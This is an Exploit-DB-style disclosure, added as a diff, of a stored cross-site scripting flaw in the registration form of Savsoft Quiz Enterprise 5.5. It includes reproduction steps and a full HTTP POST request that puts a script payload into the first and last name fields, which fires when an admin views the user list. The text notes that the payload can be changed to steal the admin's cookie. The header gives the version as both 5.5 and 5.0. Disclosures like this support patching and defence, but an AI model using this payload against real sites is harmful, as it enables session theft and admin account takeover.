@@ -1,0 +1,41 @@
+# Exploit Title: Savsoft Quiz Enterprise Version 5.5 - Persistent Cross-Site Scripting
+# Date: 2020-09-01
+# Exploit Author: Hemant Patidar (HemantSolo)
+# Vendor Homepage: https://savsoftquiz.com/
+# Software Link: https://savsoftquiz.com/web/demo.php
+# Version: 5.0
+# Tested on: Windows 10/Kali Linux
+# Contact: https://www.linkedin.com/in/hemantsolo/
+
+Stored Cross-site scripting(XSS):
+Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application. Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user's browser.
+
+Attack vector:
+This vulnerability can results attacker to inject the XSS payload in User Registration section and each time admin visits the manage user section from admin panel,
+the XSS triggers and attacker can able to steal the cookie according to the crafted payload.
+
+Vulnerable Parameters: First Name, Last Name
+1. Go to the registration page.
+2. Fill all the details  and put this payload in First and Last Name "<script>alert("OPPS")</script>"
+3. Now go to the admin panel and the XSS will be triggered.
+
+POST /savsoftquiz_v5_enterprise/index.php/login/insert_user/ HTTP/1.1
+Host: TARGET
+Connection: close
+Content-Length: 187
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: https://savsoftquiz.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://TARGET/savsoftquiz_v5_enterprise/index.php/login/registration/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: _ga=GA1.2.757300437.1598544895; _gid=GA1.2.1240991040.1598544895; ci_session=mm5q58p28e620n9im0imeildnvabkoeg
+
+email=hemantpatidar1337%40gmail.com&password=test&first_name=<script>alert("OPPS")</script>&last_name=<script>alert("OPPS")</script>&contact_no=0000000000&gid%5B%5D=1
